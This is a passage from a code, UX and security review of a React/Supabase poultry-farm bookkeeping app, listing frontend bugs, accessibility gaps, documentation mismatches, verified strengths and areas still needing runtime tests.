- Fix: one `parseNumber(s)` that maps Bangla/Arabic-Indic digits to ASCII, strips spaces and `,` only as thousands separators, rejects anything else with a field error (never `0`), enforces integer/scale per field, and has a sane max.

### FE-05 (Medium): hidden `code` field
- `masterTypes.ts:47` marks `code` `required: true, hidden: true`; `MasterPage.tsx:253-254` filters hidden fields out and only renders errors for rendered fields (`:258`). The code is filled by `nextCode()` whose failure is swallowed (`:186 .catch(() => {})`): if that fetch fails or has not returned, `required` fails on a field the user cannot see and the Save button appears to do nothing. If two tabs create at once, the second gets `23505` -> "This code is already used." (`errors.ts:34`) with no visible code field to fix (and re-opening the sheet re-suggests the same max+1 until the first save lands).
- Same race exists for batches, but there the code is visible and editable.
- Fix: generate codes in the DB (`default` from a sequence or insert trigger) and drop client `nextCode`; or show the error on the `name` row.

### FE-06 (Medium): 1000-row PostgREST cap
- `EntryListPage.tsx:66-72` (bill map per type), `:96-100` (summary over "ALL matching rows"), `PartyDetailPage.tsx:20` (all of a party type's payments, then filtered in JS), `MoneyPage` unpaid list. Beyond 1000 rows totals and statuses are silently wrong (the code has `ponytail:` comments acknowledging it). A farm with 5 sheds, 2 batches at a time, many feed/medicine bills and payments gets there in a few years.
- The `status` filter also builds `id=in.(...)` with every matching id (`:45`); a few hundred ids make the GET URL long enough for 414/400 (suspected).
- Fix: compute totals/status in SQL (view/RPC) or paginate; `count: 'exact'` to detect truncation and show a banner.

### FE-07 (Low): route/param handling
- `App.tsx:58` catch-all renders `ComingSoonPage` ("Page arrives in milestone a later (see docs/prd.md §8)") for **every** unknown URL, inside the auth shell.
- `/batches/abc`, `/batches/1.5`, `/batches/1.5/edit`, `/usages/abc/edit`: `Number()` yields NaN/1.5 -> the PostgREST query errors with raw text ("Couldn't load: invalid input syntax for type bigint: "NaN""); the forms treat `id != null` as edit mode (`UsageFormPage.tsx:37-38` etc.). `EntryDetailPage.tsx:46` guards `!Number(id)` but not decimals. `/entries/foo` silently redirects to /more. `/money/anything/5` renders supplier 5 (`PartyDetailPage.tsx:15`). `/entries/usages?batch=abc` -> raw bigint error.
- Auth: every non-`/login`, non-`/reset-password` route is under `RequireAuth` (`App.tsx:24-26`) - good; `from` redirect state is internal only.

### FE-08 (Low): error handling
- `exportBatch(id, code)` (`BatchDetailPage.tsx:105`) is fired from `onSelect` without `await`/`catch`: a failure is an unhandled rejection, no toast; it also downloads **all six tables entirely** and filters in the browser (`exportBatch.ts:8-11`).
- `errors.ts:30` detects offline only by `"Failed to fetch"` / `"NetworkError"`; iOS Safari reports `"Load failed"` -> iPhone users see "Couldn't save: Load failed" (suspected, Safari behaviour) instead of "No connection".
- `ErrorNote` prints raw PostgREST/DB text (`common/index.tsx:84-90`).
- `nextCode().catch(() => {})` (Master/Batch forms) swallows errors; `signOut()` unawaited.

### FE-09 (Low): accessibility basics
- Tap targets: `button.tsx` `default h-9` (36 px), `sm h-8` (32 px), `icon size-9` (36 px); header icon buttons, "+ Add", "Filter", chips (`EntryListPage.tsx:193-203`, clear-X is ~22 px) are below the 44 px promised in `design.md §1.7`. Form inputs are `h-11` (good).
- `billing/shared.tsx:131` `Field` renders `<Label>` with no `htmlFor` and the inputs have no `id`, so sale/purchase/chick/payment fields are not programmatically labelled (no label tap-to-focus, screen readers read "edit text"). Select triggers (`PickField`, `BatchPicker`) have no `id`/`aria-label`. `PaymentFormPage.tsx:268-272` radiogroup has no accessible name.
- Colour: status uses text badges (good); `Kpi tone="danger"` red-only for "live (must be 0)" has the label text but no icon on the KPI itself.
- Positives: `aria-label` on all icon-only buttons (13 `aria-`/`sr-only` uses), dialogs via Radix, `inputMode` set on number fields, 16 px+ inputs.

### FE-10 (Low): deleted rows
- Edit forms render for rows with `is_void=true` with no banner and show the Delete icon again (`UsageFormPage.tsx:178`, `MortalityFormPage.tsx:143`, `WeightFormPage.tsx:107`). Saving edits a deleted row; it stays deleted and the user may think it was restored. There are two delete implementations (`DeleteEntry` without Undo vs `EntryDetail` with Undo and bill-payment handling).

### FE-11 (Low): shared key with different shapes
- `["entries","sales",id]` is used by `EntryDetail` (`select "*, batches(code), buyers(name)"`, `EntryDetailPage.tsx:57`) and the sale form (`select "*"`, `SaleFormPage.tsx:99`); same for purchases/payments (`["entries","purchases",id]`, `["entries","payments",id]`). Whichever fetch ran last under the 30 s `staleTime` serves the other page, so the detail can render `—` for batch/buyer (it uses `?.`, so no crash). Use distinct keys.

### FE-12 (Low, suspected): Enter key on billing forms
- `FormBar` (`billing/shared.tsx:354-368`) renders two `type="submit"` buttons, "Save & add another" first. Implicit submission (Enter in a text field) activates the first submit button, whose `onClick` sets `again.current = true`, so Enter may save **and stay on the form**. Needs a runtime check.

### FE-13 (Info): build/lint
- `npm run build` OK (tsc strict clean: `tsc --strict` -> 0 errors; initial JS gz ~205 KB, total gz ~321 KB, vs the 250 KB first-load budget in `design.md §5.6`, borderline). `npm run lint` shows only warnings: ~30 `only-export-components`, 6 `incompatible-library` (react-hook-form `watch()` with React Compiler: stale-UI risk if components get memoised), 2 `immutability` on `billing/shared.tsx:361,366` (mutating a ref prop). 8 `as any/never/unknown as` casts; the entry/master pages read tables untyped (`entryTypes.ts:350`, `MasterPage.tsx:39`), so a column typo only fails at runtime.
- Double-submit protection: all save buttons are `disabled` while pending (good). TanStack mutations are not retried (good: no silent duplicate). `retry: 1` for queries.

---

## 5. UX / UI improvements (inferred from code and `docs/page-layouts/`)

### UX-01 (Medium): the lists are not reachable
- `docs/page-layouts/22-more.md` lists Usages, Mortality, Weights, Sales, Purchases, Chick purchases, Payments under "Records". `MorePage.tsx:15-16` has one row "All entries" -> `/entries/usages`, and `EntryListPage` has no type switcher. Grep of `/entries/` links: purchases and payments lists are linked from nowhere except the Data-checks "Add purchase" button and via URL; sales/mortality/weights/chick lists only through "See all" in a batch. Feature F-41 (Must) is effectively hidden. Fix: restore the Records group (7 rows) or add a segmented type picker in the list header.

### UX-02 (Low): chick purchase must come first, but the app never says so
- `MortalityFormPage.tsx:99,133` and `SaleFormPage.tsx:144,204` hard-block when `live_balance <= 0`: for a new batch (no chick purchase yet) the user gets "Only 0 birds are live in B-003". Add "Record the chick purchase first" with a link (BatchDetail has such an alert; the forms do not), or downgrade to a warning like the other checks.

### UX-03 (Low): docs vs implementation
| Doc | Implementation |
|---|---|
| 22-more: Records (7), Store, Data checks count badge, "v1.0" | one "All entries" row, no badge, "v0.1" |
| 02-home: pull-to-refresh / refresh button; "Couldn't load. Pull to refresh." | none; relies on focus refetch |
| design §2/§5.2: sidebar >= 1024 px, `Command` combobox pickers, Accordion, Money/Stock pickers `pickers/` folder | phone column only (`AppShell.tsx:17` max-w-screen-sm); plain `Select`s (long item/party lists, no search) |
| design §4.3: bills delete shows toast Undo | only in EntryDetail, not in edit-form delete |
| F-22: close needs confirmation when balance != 0 | bypassable from the batch Edit form (BIZ-13) |
| F-40: restore re-validates | does not (BIZ-01) |
| 01-login: "Network error: No connection. Try again." | works for Chrome, not Safari "Load failed" (FE-08) |
| S6 / schema §9: no hard deletes, codes never reused | hard delete for masters/batches, max+1 reuse (BIZ-15) |

### UX-04 (Low): small polish (Verified in view output)
- `v_bills.description` yields `Grower feed × 100.000 bag` (numeric(12,3) printed with trailing zeros, singular unit) shown in Money, Payment and Party pages; format with `trim_scale(qty)`.
- `age(days)` prints `Day -3 · Wk 0` for a batch with a future start date; `BatchesPage` shows "Day -3".
- Money page lists settled parties first-class under a `<details>`; archived suppliers with dues are still listed (fine) but not marked.
- Suggest: persistent "unsaved" draft for long forms (a session expiry or reload loses a half-typed sale; design §4.1 only keeps values on *save failure*); a "Copy yesterday's usage" shortcut; a visible "Last saved X" confirmation on Home; explain `e` suffix (FCR est.) with a tooltip; show the DB-calculated amount in the toast instead of the client's.
- iOS standalone PWA often cannot download a blob/zip via `a.click()` (`csv.ts:18-24`): verify on a phone, consider `navigator.share({files})`.

---

## 6. What looks good

- No secrets in the bundle or in git history (verified); only the publishable key and URL are shipped; `.env*` ignored.
- `npm audit`: 0 vulnerabilities (dev and prod). `tsc` clean in strict mode.
- RLS enabled on every table; all views `security_invoker`; RPCs `security invoker` with `execute` revoked from `public/anon`; no `SECURITY DEFINER`; no dynamic SQL; no `dangerouslySetInnerHTML`; user input never reaches `.or()`/raw filters.
- Money/quantity constraints in the DB are thoughtful: generated columns, `check`s (`sales_net`, `sales_amount`, `chick_purchases_discount`, `payments_one_bill`, `payments_party`), `numeric` everywhere (no floats in storage), FK indexes, `ceil(gross/20)` crates match the client exactly (0 float mismatches), purchase amount preview matches DB (0 of 1,000,000).
- Divide-by-zero guarded in all views via `nullif`; void rows excluded consistently; closed vs open batch KPIs separated in the UI.
- Payment guard correctly re-validates on `is_void` restore (it fires on every update) and on bill re-pointing.
- Auth: protected routes all under `RequireAuth`, `from` redirect is internal-only, login errors do not reveal which field was wrong, reset `redirectTo` is derived from `window.location.origin`.
- Forms: disabled-while-pending buttons, hard-validate on the client with sensible warnings (weights 20-5000 g, price swings > 25 %, unusual mortality), live previews, last-used defaults wrapped in try/catch for storage, safe-area padding, 16 px inputs, route-level code splitting, hand-rolled ZIP writer verified valid (`unzip -t` passes) and UTF-8 BOM for Excel.
- Export pages past the 1000-row cap correctly (`fetchAll` pages with a stable order).

---

## 7. Not covered / needs a runtime test

1. **Supabase dashboard settings (cannot be read from the repo):** sign-ups disabled? anonymous sign-ins off? email confirmation, other providers, OTP/magic link, redirect-URL allow-list (no wildcards/localhost), site URL, password min length, leaked-password protection, MFA, JWT expiry, SMTP rate limits, which schemas the Data API exposes, pg_graphql on/off. Run the Supabase security advisor (`get_advisors`) against the real project.
2. **Real RLS behaviour as `anon` and `authenticated`** against the live project (default privilege grants differ from my local role setup): confirm `anon` gets 0 rows and cannot call RPCs.
3. **Deployed headers:** `curl -I` of the Vercel URL (HSTS, CSP after SEC-04), caching of `index.html`, and that the SPA rewrite does not shadow `manifest.webmanifest`/icons.
4. **Phone testing:** Bangla keyboard digits in `inputMode=decimal`, iOS Safari error text "Load failed", iOS PWA zip download, Enter-key behaviour (FE-12), tap-target feel, date picker defaults with a wrong device time zone, keyboard covering the sticky Save bar.
5. **Concurrency in the live app:** two devices editing the same bill/payment; Undo toast vs navigating away; double-tap on slow 3G.
6. **Long-term volume:** behaviour past 1000 rows (FE-06), the `in.(ids)` URL length with a large status filter, `v_bills` OR-join plan performance, offset pagination with concurrent inserts.
7. **Stale-cache findings (FE-01/02/11)** are proven from key names; a quick Playwright run (save a mortality, go back, compare the batch page sections and Home "Today") would show the visible effect.
8. **Not tested:** the Playwright/visual layer, Supabase Realtime (not used), email templates, rate limiting, backup/restore of the free-plan DB, region latency (project pooler is `ap-northeast-2`, Seoul).

### Reproduction harness
Local only: `initdb` in the scratchpad, roles `anon`/`authenticated` created, `psql -f supabase/migrations/20261002000000_init.sql`, then the scenario SQL for BIZ-01..06/08/12 and `node` snippets for FE-04, BIZ-07, BIZ-10 and SEC-03. The cluster was stopped afterwards; no repo source file was modified.
